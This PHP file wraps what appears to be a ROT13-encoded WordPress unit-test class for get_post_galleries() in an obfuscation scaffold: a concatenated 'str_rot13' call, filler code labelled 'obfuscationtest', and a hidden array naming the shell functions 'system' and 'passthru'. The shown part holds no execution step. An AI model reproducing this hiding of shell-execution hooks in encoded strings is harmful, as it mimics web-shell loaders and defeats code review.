<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc zrqvn
 *
 * @pbiref ::trg_cbfg_tnyyrevrf
 */
pynff Grfgf_Zrqvn_TrgCbfgTnyyrevrf rkgraqf JC_HavgGrfgPnfr {

	pbafg VZT_ZRGN = neenl(
		'jvqgu'  => 100,
		'urvtug' => 100,
		'fvmrf'  => '',
	);

	/**
	 * Grfgf gung na rzcgl neenl vf erghearq sbe n cbfg gung qbrf abg rkvfg.
	 *
	 * @gvpxrg 43826
	 */
	choyvp shapgvba grfg_ergheaf_rzcgl_neenl_jvgu_aba_rkvfgrag_cbfg() {
		$tnyyrevrf = trg_cbfg_tnyyrevrf( 99999, snyfr );
		$guvf->nffregRzcgl( $tnyyrevrf );
	}

	/**
	 * Grfgf gung na rzcgl neenl vf erghearq sbe n cbfg gung unf ab tnyyrel.
	 *
	 * @gvpxrg 43826
	 */
	choyvp shapgvba grfg_ergheaf_rzcgl_neenl_jvgu_cbfg_jvgu_ab_tnyyrel() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '<c>N cbfg jvgu ab tnyyrel</c>',
			)
		);

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );
		$guvf->nffregRzcgl( $tnyyrevrf );
	}

	/**
	 * Grfgf gung bayl tnyyrevrf ner erghearq.
	 *
	 * @qngnCebivqre qngn_ergheaf_bayl_tnyyrevrf
	 *
	 * @gvpxrg 55203
	 *
	 * @cnenz fgevat $pbagrag Gur pbagrag bs gur cbfg.
	 * @cnenz fgevat $arrqyr  Gur pbagrag bs n aba-tnyyrel oybpx.
	 */
	choyvp shapgvba grfg_ergheaf_bayl_tnyyrevrf( $pbagrag, $arrqyr ) {
		$vzntr_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => 0,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct';

		$pbagrag = fge_ercynpr(
			neenl( 'VZNTR_VQ', 'VZNTR_HEY' ),
			neenl( $vzntr_vq, $vzntr_hey ),
			$pbagrag
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $pbagrag,
			)
		);

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq );
		$npghny    = vzcybqr( '', $tnyyrevrf );

		$guvf->nffregFgevatAbgPbagnvafFgevat( $arrqyr, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_ergheaf_bayl_tnyyrevrf() {
		$tnyyrel = '
		<!-- jc:tnyyrel {\"yvaxGb\":\"abar\",\"pynffAnzr\":\"pbyhzaf-2\"} -->
		<svther
		pynff=\"jc-oybpx-tnyyrel unf-arfgrq-vzntrf pbyhzaf-qrsnhyg vf-pebccrq pbyhzaf-2\"
		>
		<!-- jc:vzntr {\"vq\":VZNTR_VQ,\"fvmrFyht\":\"ynetr\",\"yvaxQrfgvangvba\":\"abar\"} -->
		<svther pynff=\"jc-oybpx-vzntr fvmr-ynetr\">
		<vzt
		fep=\"VZNTR_HEY\"
		nyg=\"Vzntr tnyyrel vzntr\"
		pynff=\"jc-vzntr-VZNTR_VQ\"
		/>
		</svther>
		<!-- /jc:vzntr -->
		</svther>
		<!-- /jc:tnyyrel -->
		';

		erghea neenl(
			'n cnentencu orsber n tnyyrel' => neenl(
				'pbagrag' => '<!-- jc:cnentencu --><c>N cnentencu orsber n tnyyrel.</c><!-- /jc:cnentencu -->' . $tnyyrel,
				'arrqyr'  => 'N cnentencu orsber n tnyyrel.',
			),
			'n cnentencu nsgre n tnyyrel'  => neenl(
				'pbagrag' => $tnyyrel . '<!-- jc:cnentencu --><c>N cnentencu nsgre n tnyyrel.</c><!-- /jc:cnentencu -->',
				'arrqyr'  => 'N cnentencu nsgre n tnyyrel.',
			),
		);
	}

	/**
	 * Grfgf gung ab fepf ner erghearq sbe n fubegpbqr tnyyrel
	 * va n cbfg jvgu ab nggnpurq vzntrf.
	 *
	 * @gvpxrg 39304
	 *
	 * @tebhc fubegpbqr
	 */
	choyvp shapgvba grfg_ergheaf_ab_fepf_jvgu_fubegpbqr_va_cbfg_jvgu_ab_nggnpurq_vzntrf() {
		// Frg hc na hanggnpurq vzntr.
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => 0,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '[tnyyrel]',
			)
		);

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregRzcgl(
			$tnyyrevrf[0]['fep'],
			'Gur fep xrl vf abg rzcgl.'
		);
	}

	/**
	 * Grfgf gung ab fepf ner erghearq sbe n tnyyrel oybpx
	 * va n cbfg jvgu ab nggnpurq vzntrf.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_ergheaf_ab_fepf_jvgu_oybpx_va_cbfg_jvgu_ab_nggnpurq_vzntrf() {
		// Frg hc na hanggnpurq vzntr.
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => 0,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '<!-- jc:tnyyrel -->',
			)
		);

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs fgevatf
		 * vafgrnq bs na neenl bs neenlf.
		 */
		$guvf->nffregVfNeenl(
			$tnyyrevrf[0],
			'Gur erghearq qngn qbrf abg pbagnva na neenl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregRzcgl(
			$tnyyrevrf[0]['fep'],
			'Gur fep xrl bs gur svefg tnyyrel vf abg rzcgl.'
		);
	}

	/**
	 * Grfgf gung ab fepf ner erghearq sbe n tnyyrel oybpx i2
	 * va n cbfg jvgu ab nggnpurq vzntrf.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_ergheaf_ab_fepf_jvgu_oybpx_i2_va_cbfg_jvgu_ab_nggnpurq_vzntrf() {
		// Frg hc na hanggnpurq vzntr.
		$vzntr_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => 0,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct';

		$oybo = <<< OYBO
<!-- jc:tnyyrel {\"yvaxGb\":\"abar\",\"pynffAnzr\":\"pbyhzaf-2\"} -->
<svther
	pynff=\"jc-oybpx-tnyyrel unf-arfgrq-vzntrf pbyhzaf-qrsnhyg vf-pebccrq pbyhzaf-2\"
>
	<!-- jc:vzntr {\"vq\":$vzntr_vq,\"fvmrFyht\":\"ynetr\",\"yvaxQrfgvangvba\":\"abar\"} -->
	<svther pynff=\"jc-oybpx-vzntr fvmr-ynetr\">
		<vzt
			fep=\"$vzntr_hey\"
			nyg=\"Vzntr tnyyrel vzntr\"
			pynff=\"jc-vzntr-$vzntr_vq\"
		/>
	</svther>
	<!-- /jc:vzntr -->
</svther>
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $oybo,
			)
		);

		$rkcrpgrq_fepf = neenl( $vzntr_hey );
		$tnyyrevrf     = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs fgevatf
		 * vafgrnq bs na neenl bs neenlf.
		 */
		$guvf->nffregVfNeenl(
			$tnyyrevrf[0],
			'Gur erghearq qngn qbrf abg pbagnva na neenl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			$rkcrpgrq_fepf,
			$tnyyrevrf[0]['fep'],
			'Gur rkcrpgrq naq npghny fepf ner abg gur fnzr.'
		);
	}

	/**
	 * Grfgf gung UGZY vf erghearq sbe n fubegpbqr tnyyrel.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc fubegpbqr
	 */
	choyvp shapgvba grfg_ergheaf_ugzy_jvgu_fubegpbqr_tnyyrel() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'V unir ab tnyyrel',
			)
		);

		$cbfg_vq_gjb = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => \"[tnyyrel vq='$cbfg_vq']\",
			)
		);

		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$rkcrpgrq  = 'fep=\"uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct\"';
		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq_gjb );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs neenlf
		 * vafgrnq bs na neenl bs fgevatf.
		 */
		$guvf->nffregVfFgevat(
			$tnyyrevrf[0],
			'Qvq abg erghea gur qngn nf n fgevat.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			$rkcrpgrq,
			$tnyyrevrf[0],
			'Gur erghearq qngn qvq abg pbagnva n fep nggevohgr jvgu gur rkcrpgrq vzntr HEY.'
		);
	}

	/**
	 * Grfgf gung UGZY vf erghearq sbe n oybpx tnyyrel.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_ergheaf_ugzy_jvgu_oybpx_tnyyrel() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'V unir ab tnyyrel.',
			)
		);

		// Frg hc na hanggnpurq vzntr.
		$vzntr_vq = frys::snpgbel()->nggnpuzrag->perngr(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct';

		$oybo = <<< OYBO
<!-- jc:tnyyrel -->
<svther><vzt fep=\"$vzntr_hey\" qngn-vq=\"$vzntr_vq\" /></svther>
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq_gjb = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $oybo,
			)
		);

		$rkcrpgrq  = 'fep=\"uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct\"';
		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq_gjb );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs neenlf
		 * vafgrnq bs na neenl bs fgevatf.
		 */
		$guvf->nffregVfFgevat(
			$tnyyrevrf[0],
			'Qvq abg erghea gur qngn nf n fgevat.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			$rkcrpgrq,
			$tnyyrevrf[0],
			'Gur erghearq qngn qvq abg pbagnva n fep nggevohgr jvgu gur rkcrpgrq vzntr HEY.'
		);
	}

	/**
	 * Grfgf gung UGZY vf erghearq sbe n oybpx tnyyrel i2.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_ergheaf_ugzy_jvgu_oybpx_tnyyrel_i2() {
		$vzntr_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => 0,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct';

		$oybo = <<< OYBO
<!-- jc:tnyyrel {\"yvaxGb\":\"abar\",\"pynffAnzr\":\"pbyhzaf-2\"} -->
<svther
	pynff=\"jc-oybpx-tnyyrel unf-arfgrq-vzntrf pbyhzaf-qrsnhyg vf-pebccrq pbyhzaf-2\"
>
	<!-- jc:vzntr {\"vq\":$vzntr_vq,\"fvmrFyht\":\"ynetr\",\"yvaxQrfgvangvba\":\"abar\"} -->
	<svther pynff=\"jc-oybpx-vzntr fvmr-ynetr\">
		<vzt
			fep=\"$vzntr_hey\"
			nyg=\"Vzntr tnyyrel vzntr\"
			pynff=\"jc-vzntr-$vzntr_vq\"
		/>
	</svther>
	<!-- /jc:vzntr -->
</svther>
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $oybo,
			)
		);

		$rkcrpgrq  = 'fep=\"uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct\"';
		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs neenlf
		 * vafgrnq bs na neenl bs fgevatf.
		 */
		$guvf->nffregVfFgevat(
			$tnyyrevrf[0],
			'Qvq abg erghea gur qngn nf n fgevat.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			$rkcrpgrq,
			$tnyyrevrf[0],
			'Gur erghearq qngn qvq abg pbagnva n fep nggevohgr jvgu gur rkcrpgrq vzntr HEY.'
		);
	}

	/**
	 * Grfgf gung gur tybony cbfg bowrpg qbrf abg bireevqr
	 * n cebivqrq cbfg VQ jvgu n fubegpbqr tnyyrel.
	 *
	 * @gvpxrg 39304
	 *
	 * @tebhc fubegpbqr
	 */
	choyvp shapgvba grfg_erfcrpgf_cbfg_vq_jvgu_fubegpbqr_tnyyrel() {
		$tybony_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Tybony Cbfg',
			)
		);
		$cbfg_vq        = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '[tnyyrel]',
			)
		);
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);
		$rkcrpgrq_fepf = neenl(
			'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct',
		);

		// Frg gur tybony $cbfg pbagrkg gb gur bgure cbfg.
		$TYBONYF['cbfg'] = trg_cbfg( $tybony_cbfg_vq );

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			$rkcrpgrq_fepf,
			$tnyyrevrf[0]['fep'],
			'Gur rkcrpgrq naq npghny fepf ner abg gur fnzr.'
		);
	}

	/**
	 * Grfgf gung gur tybony cbfg bowrpg qbrf abg bireevqr
	 * n cebivqrq cbfg VQ jvgu n oybpx tnyyrel.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpx
	 */
	choyvp shapgvba grfg_erfcrpgf_cbfg_vq_jvgu_oybpx_tnyyrel() {
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 3 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<svther><vzt fep=\"' . $hey . '\" qngn-vq=\"' . $v . '\" /></svther>';

		}

		$vqf_wbvarq = vzcybqr( ',', $vqf );

		$tybony_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Tybony Cbfg',
			)
		);

		$oybo = <<< OYBO
<!-- jc:tnyyrel {\"vqf\":[$vqf_wbvarq]} -->
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $oybo,
			)
		);
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);
		$rkcrpgrq_fepf = neenl(
			'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct',
		);

		// Frg gur tybony $cbfg pbagrkg gb gur bgure cbfg.
		$TYBONYF['cbfg'] = trg_cbfg( $tybony_cbfg_vq );

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				neenl(
					'vqf' => $vqf_wbvarq,
					'fep' => $vqf_fepf,
				),
			),
			$tnyyrevrf,
			'Gur rkcrpgrq naq npghny fepf ner abg gur fnzr.'
		);
	}

	/**
	 * Grfgf gung gur tybony cbfg bowrpg qbrf abg bireevqr
	 * n cebivqrq cbfg VQ jvgu n oybpx tnyyrel i2.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpx
	 */
	choyvp shapgvba grfg_erfcrpgf_cbfg_vq_jvgu_oybpx_tnyyrel_i2() {
		$nggnpuzrag_vq  = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			'vzntr1.wct',
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);
		$zrgnqngn       = neenl_zretr( neenl( 'svyr' => 'vzntr1.wct' ), frys::VZT_ZRGN );
		$hey            = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . 'vzntr1.wct';
		$tybony_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Tybony Cbfg',
			)
		);

		jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );

		$oybo = <<< OYBO
<!-- jc:tnyyrel {\"yvaxGb\":\"abar\",\"pynffAnzr\":\"pbyhzaf-2\"} -->
<svther
	pynff=\"jc-oybpx-tnyyrel unf-arfgrq-vzntrf pbyhzaf-qrsnhyg vf-pebccrq pbyhzaf-2\"
>
	<!-- jc:vzntr {\"vq\":$nggnpuzrag_vq,\"fvmrFyht\":\"ynetr\",\"yvaxQrfgvangvba\":\"abar\"} -->
	<svther pynff=\"jc-oybpx-vzntr fvmr-ynetr\">
		<vzt
			fep=\"$hey\"
			nyg=\"Vzntr tnyyrel vzntr\"
			pynff=\"jc-vzntr-$nggnpuzrag_vq\"
		/>
	</svther>
	<!-- /jc:vzntr -->
</svther>
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $oybo,
			)
		);
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);
		$rkcrpgrq_fepf = neenl(
			'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct',
		);

		// Frg gur tybony $cbfg pbagrkg gb gur bgure cbfg.
		$TYBONYF['cbfg'] = trg_cbfg( $tybony_cbfg_vq );

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				neenl(
					'vqf' => (fgevat) $nggnpuzrag_vq,
					'fep' => neenl( $hey ),
				),
			),
			$tnyyrevrf,
			'Gur rkcrpgrq naq npghny fepf ner abg gur fnzr.'
		);
	}

	/**
	 * Grfgf gung gur tnyyrel bayl pbagnvaf vzntrf fcrpvsvrq va
	 * gur fubegpbqr'f vq nggevohgr.
	 *
	 * @gvpxrg 39304
	 *
	 * @tebhc fubegpbqr
	 */
	choyvp shapgvba grfg_erfcrpgf_fubegpbqr_vq_nggevohgr() {
		$cbfg_vq     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Ab tnyyrel qrsvarq',
			)
		);
		$cbfg_vq_gjb = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => \"[tnyyrel vq='$cbfg_vq']\",
			)
		);
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'           => 'grfg.wct',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);
		$rkcrpgrq_fepf = neenl(
			'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg.wct',
		);

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq_gjb, snyfr );

		// Frg gur tybony $cbfg pbagrkg.
		$TYBONYF['cbfg']               = trg_cbfg( $cbfg_vq_gjb );
		$tnyyrevrf_jvgu_tybony_pbagrkg = trg_cbfg_tnyyrevrf( $cbfg_vq_gjb, snyfr );

		// Purpx gung gur tybony cbfg fgngr qbrfa'g nssrpg gur erfhygf.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			$tnyyrevrf,
			$tnyyrevrf_jvgu_tybony_pbagrkg,
			'Gur tybony cbfg fgngr nssrpgrq gur erfhygf.'
		);

		// Gur zrgubq pna erghea na rzcgl neenl.
		$guvf->nffregAbgRzcgl(
			$tnyyrevrf,
			'Gur tnyyrevrf neenl vf rzcgl.'
		);

		/*
		 * Gur zrgubq pna erghea na neenl bs fgevatf
		 * vafgrnq bs na neenl bs neenlf.
		 */
		$guvf->nffregVfNeenl(
			$tnyyrevrf[0],
			'Gur erghearq qngn qbrf abg pbagnva na neenl.'
		);

		/*
		 * Guvf ceriragf shgher punatrf sebz pnhfvat
		 * onpxjneqf pbzcngvovyvgl oernxf.
		 */
		$guvf->nffregNeenlUnfXrl(
			'fep',
			$tnyyrevrf[0],
			'N fep xrl qbrf abg rkvfg.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			$rkcrpgrq_fepf,
			$tnyyrevrf[0]['fep'],
			'Gur rkcrpgrq naq npghny fepf ner abg gur fnzr.'
		);
	}

	/**
	 * Grfgf gung tnyyrevrf bayl pbagnva vzntrf fcrpvsvrq va gur
	 * vq nggevohgr bs gurve erfcrpgvir fubegpbqr naq oybpx.
	 *
	 * @gvpxrg 43826
	 *
	 * @tebhc oybpxf
	 * @tebhc fubegpbqr
	 */
	choyvp shapgvba grfg_erfcrpgf_fubegpbqr_naq_oybpx_vq_nggevohgrf() {
		/*
		 * Grfg gur trg_cbfg_tnyyrevrf() shapgvba va `$ugzy = snyfr` zbqr,
		 * jvgu obgu fubegpbqr naq oybpx tnyyrevrf.
		 */
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<svther><vzt fep=\"' . $hey . '\" qngn-vq=\"' . $v . '\" /></svther>';

		}

		$vqf1_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf, 0, 3 ) );
		$vqf2_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf, 3, 3 ) );

		$oybo = <<<OYBO
[tnyyrel vqf=\"$vqf1_wbvarq\"]

<!-- jc:tnyyrel {\"vqf\":[$vqf2_wbvarq]} -->
<!-- /jc:tnyyrel -->
OYBO;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );

		$tnyyrevrf = trg_cbfg_tnyyrevrf( $cbfg_vq, snyfr );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				neenl(
					'vqf' => $vqf1_wbvarq,
					'fep' => neenl_fyvpr( $vqf_fepf, 0, 3 ),
				),
				neenl(
